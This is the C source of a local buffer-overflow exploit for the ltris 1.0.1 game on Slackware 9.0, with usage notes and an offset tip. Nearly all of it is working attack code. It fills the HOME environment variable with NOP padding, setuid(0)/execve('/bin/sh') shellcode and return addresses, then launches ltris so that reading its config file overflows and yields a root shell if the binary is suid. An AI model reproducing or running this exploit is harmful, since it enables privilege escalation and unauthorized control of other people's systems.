/*
   ltris-1.0.1 - www.lgames.org
   -----------
   /usr/local/bin/ltris local exploit
   tested on slack 9.0

   nb. ltris isnt install with the suid bit set as default

   USAGE: ./BH-ltris (offset) 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char hellcode[] =
  "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
  "\x31\xc0\x50\x68\x6e\x2f\x73\x68"
  "\x68\x2f\x2f\x62\x69\x89\xe3\x50"
  "\x53\x89\xe1\xb0\x0b\xcd\x80";    // setuid(0); execve /bin/sh

#define NOP  0x90
#define LEN  550
#define RET  0xbffff720

int main (int argc, char *argv[])
{

  char expbuf[LEN];
  int count = 0;
  int offset = 0;
  unsigned long addr;

  if (argc > 1)
    offset = atoi (argv[1]); // try using a different offset if the
		             // exploit isnt successful
  addr = RET - offset;

  for (count = 0; count <= LEN; count += 4)
    *(long *) &expbuf[count] = addr;	    // fill with ret-offset

  for (count = 0; count < (LEN - strlen (hellcode) - 100); count++)
    *(expbuf + count) = NOP;		   // pad with NOPS

  memcpy (expbuf + count, hellcode, strlen (hellcode));

  setenv ("HOME", expbuf, 1);
  execlp ("ltris", "ltris", NULL);	/* ltris tries to read/create a
					   configfile from the users home
					   directory 
 					*/

  return 0;
}
